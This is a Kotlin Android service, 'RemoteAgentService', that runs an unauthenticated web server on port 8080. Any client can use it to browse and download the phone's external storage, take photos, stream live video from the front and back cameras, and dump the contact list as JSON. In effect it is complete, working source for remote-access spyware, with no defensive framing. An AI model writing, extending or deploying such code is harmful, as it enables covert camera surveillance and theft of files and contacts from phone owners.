package com.example.alex


import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.Environment
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import fi.iki.elonen.NanoHTTPD
import fi.iki.elonen.NanoHTTPD.newChunkedResponse
import fi.iki.elonen.NanoHTTPD.newFixedLengthResponse
import java.io.File
import java.io.FileInputStream
import java.net.URLConnection
import java.util.concurrent.CountDownLatch
import java.util.concurrent.Executors
import android.content.Context
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.provider.ContactsContract
import com.google.gson.Gson
import java.io.PipedInputStream
import java.io.PipedOutputStream





class RemoteAgentService : Service() {

    private lateinit var server: NanoHTTPD

    override fun onCreate() {
        super.onCreate()
        startForeground(1, createNotification())
        startServer()
    }

    private fun startServer() {
        server = object : NanoHTTPD(8080) {
            override fun serve(session: IHTTPSession): Response {
                return when {
                    session.uri.startsWith("/files") -> handleFileList(session)
                    session.uri == "/capture/front" -> captureCameraImage(CameraCharacteristics.LENS_FACING_FRONT)
                    session.uri == "/capture/back" -> captureCameraImage(CameraCharacteristics.LENS_FACING_BACK)
                    session.uri == "/video/front" -> streamCameraVideo(CameraCharacteristics.LENS_FACING_FRONT)
                    session.uri == "/video/back" -> streamCameraVideo(CameraCharacteristics.LENS_FACING_BACK)
                    session.uri == "/contacts" -> getContacts()
                    session.uri == "/status" -> newFixedLengthResponse("OK: ${System.currentTimeMillis()}")
                    else -> newFixedLengthResponse(
                        Response.Status.OK,
                        "text/html",
                        """
                        <h3>Remote Agent Active</h3>
                        <ul>
                            <li><a href='/files'>📁 Browse Files</a></li>
                            <li><a href='/contacts'>📸 Contacts</a></li>
                            <li><a href='/capture/front'>🤳 Front Camera</a></li>
                            <li><a href='/capture/back'>📸 Back Camera</a></li>
                             <li><a href='/video/front'>🤳 Front Video Camera</a></li>
                            <li><a href='/video/back'>📸 Back Video Camera</a></li>
                        </ul>
                    """.trimIndent()
                    )
                }
            }
        }
        server.start()
    }

    private fun handleFileList(session: NanoHTTPD.IHTTPSession): NanoHTTPD.Response {
        val baseDir = Environment.getExternalStorageDirectory()
        val relativePath = session.uri.removePrefix("/files").trim('/')
        val target = File(baseDir, relativePath)

        if (!target.exists()) {
            return newFixedLengthResponse(NanoHTTPD.Response.Status.NOT_FOUND, "text/plain", "404 Not Found")
        }

        // If directory → show clickable list
        if (target.isDirectory) {
            val files = target.listFiles()?.sortedBy { !it.isDirectory } ?: emptyList()
            val html = buildString {
                append("<h3>Index of /files/$relativePath</h3><ul>")
                if (relativePath.isNotEmpty()) {
                    val parent = File(relativePath).parent ?: ""
                    append("<li><a href='/files/$parent'>⬅️ Up</a></li>")
                }
                for (file in files) {
                    val name = file.name
                    val href = "/files/" + if (relativePath.isEmpty()) name else "$relativePath/$name"
                    val display = if (file.isDirectory) "📁 $name" else "📄 $name"
                    append("<li><a href='$href'>$display</a></li>")
                }
                append("</ul>")
            }
            return newFixedLengthResponse(NanoHTTPD.Response.Status.OK, "text/html", html)
        }

        // If file → download stream
        val mime = URLConnection.guessContentTypeFromName(target.name) ?: "application/octet-stream"
        val inputStream = FileInputStream(target)
        return newChunkedResponse(NanoHTTPD.Response.Status.OK, mime, inputStream)
    }

    private fun captureCameraImage(lensFacing: Int): NanoHTTPD.Response {
        val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val resultLatch = CountDownLatch(1)
        var imageBytes: ByteArray? = null

        try {
            // Find camera ID
            val cameraId = cameraManager.cameraIdList.first { id ->
                val chars = cameraManager.getCameraCharacteristics(id)
                chars.get(CameraCharacteristics.LENS_FACING) == lensFacing
            }

            val reader = ImageReader.newInstance(640, 480, android.graphics.ImageFormat.JPEG, 1)
            val handlerThread = HandlerThread("CameraThread").apply { start() }
            val handler = Handler(handlerThread.looper)

            val stateCallback = object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                    captureRequest.addTarget(reader.surface)

                    camera.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            reader.setOnImageAvailableListener({ reader ->
                                val image = reader.acquireLatestImage()
                                val buffer = image.planes[0].buffer
                                val bytes = ByteArray(buffer.remaining())
                                buffer.get(bytes)
                                image.close()
                                imageBytes = bytes
                                session.close()
                                camera.close()
                                handlerThread.quitSafely()
                                resultLatch.countDown()
                            }, handler)
                            session.capture(captureRequest.build(), object : CameraCaptureSession.CaptureCallback() {}, handler)
                        }

                        override fun onConfigureFailed(session: CameraCaptureSession) {
                            session.close()
                            camera.close()
                            handlerThread.quitSafely()
                            resultLatch.countDown()
                        }
                    }, handler)
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    handlerThread.quitSafely()
                    resultLatch.countDown()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    handlerThread.quitSafely()
                    resultLatch.countDown()
                }
            }

            try {
                cameraManager.openCamera(cameraId, stateCallback, handler)
            } catch (e: SecurityException) {
                e.printStackTrace()
                return NanoHTTPD.newFixedLengthResponse(
                    NanoHTTPD.Response.Status.FORBIDDEN,
                    "text/plain",
                    "Camera access denied"
                )
            }
            resultLatch.await() // wait for image capture
        } catch (e: Exception) {
            e.printStackTrace()
        }

        return if (imageBytes != null)
            NanoHTTPD.newFixedLengthResponse(
                NanoHTTPD.Response.Status.OK,
                "image/jpeg",
                java.io.ByteArrayInputStream(imageBytes),
                imageBytes!!.size.toLong()
            )
        else
            NanoHTTPD.newFixedLengthResponse(NanoHTTPD.Response.Status.INTERNAL_ERROR, "text/plain", "Failed to capture image")
    }

    private fun streamCameraVideo(lensFacing: Int): NanoHTTPD.Response {
        // Check CAMERA permission
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA)
            != PackageManager.PERMISSION_GRANTED
        ) {
            return NanoHTTPD.newFixedLengthResponse(
                NanoHTTPD.Response.Status.FORBIDDEN,
                "text/plain",
                "Camera permission not granted"
            )
        }

        val pipeInput = PipedInputStream()
        val pipeOutput = PipedOutputStream(pipeInput)

        // Start background thread for streaming
        Executors.newSingleThreadExecutor().execute {
            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val handlerThread = HandlerThread("MJPEGCameraThread").apply { start() }
            val handler = Handler(handlerThread.looper)

            try {
                val cameraId = cameraManager.cameraIdList.first { id ->
                    val chars = cameraManager.getCameraCharacteristics(id)
                    chars.get(CameraCharacteristics.LENS_FACING) == lensFacing
                }

                val reader = ImageReader.newInstance(320, 240, ImageFormat.JPEG, 2)

                val stateCallback = object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        try {
                            val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                            request.addTarget(reader.surface)

                            camera.createCaptureSession(listOf(reader.surface),
                                object : CameraCaptureSession.StateCallback() {
                                    override fun onConfigured(session: CameraCaptureSession) {
                                        reader.setOnImageAvailableListener({ r ->
                                            val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                                            val buffer = img.planes[0].buffer
                                            val bytes = ByteArray(buffer.remaining())
                                            buffer.get(bytes)
                                            img.close()

                                            try {
                                                pipeOutput.write("--frame\r\nContent-Type: image/jpeg\r\nContent-Length: ${bytes.size}\r\n\r\n".toByteArray())
                                                pipeOutput.write(bytes)
                                                pipeOutput.write("\r\n".toByteArray())
                                                pipeOutput.flush()
                                            } catch (_: Exception) {
                                                camera.close()
                                                handlerThread.quitSafely()
                                            }
                                        }, handler)

                                        session.setRepeatingRequest(request.build(), null, handler)
                                    }

                                    override fun onConfigureFailed(session: CameraCaptureSession) {
                                        session.close()
                                        camera.close()
                                        handlerThread.quitSafely()
                                    }
                                }, handler
                            )
                        } catch (se: SecurityException) {
                            se.printStackTrace()
                            pipeOutput.close()
                            handlerThread.quitSafely()
                        }
                    }

                    override fun onDisconnected(camera: CameraDevice) {
                        camera.close()
                        handlerThread.quitSafely()
                    }

                    override fun onError(camera: CameraDevice, error: Int) {
                        camera.close()
                        handlerThread.quitSafely()
                    }
                }

                try {
                    cameraManager.openCamera(cameraId, stateCallback, handler)
                } catch (se: SecurityException) {
                    se.printStackTrace()
                    pipeOutput.close()
                }

            } catch (e: Exception) {
                e.printStackTrace()
                pipeOutput.close()
                handlerThread.quitSafely()
            }
        }

        // Return the InputStream to NanoHTTPD for chunked response
        return NanoHTTPD.newChunkedResponse(
            NanoHTTPD.Response.Status.OK,
            "multipart/x-mixed-replace; boundary=frame",
            pipeInput
        )
    }

    private fun getContacts(): NanoHTTPD.Response {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            return NanoHTTPD.newFixedLengthResponse(
                NanoHTTPD.Response.Status.FORBIDDEN,
                "text/plain",
                "Contacts permission not granted"
            )
        }

        val contactsList = mutableListOf<Map<String, String>>()
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ),
            null,
            null,
            null
        )

        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                contactsList.add(mapOf("name" to name, "number" to number))
            }
        }

        val json = Gson().toJson(contactsList)
        return NanoHTTPD.newFixedLengthResponse(
            NanoHTTPD.Response.Status.OK,
            "application/json",
            json
        )
    }







    private fun createNotification(): Notification {
        val channelId = "remote_agent_channel"
        val name = "Remote Agent"
        val manager = getSystemService(NotificationManager::class.java)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, name, NotificationManager.IMPORTANCE_LOW)
            manager.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("Remote Agent Active")
            .setContentText("Listening for commands on port 8080")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setOngoing(true)
            .build()
    }

    override fun onDestroy() {
        super.onDestroy()
        server.stop()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}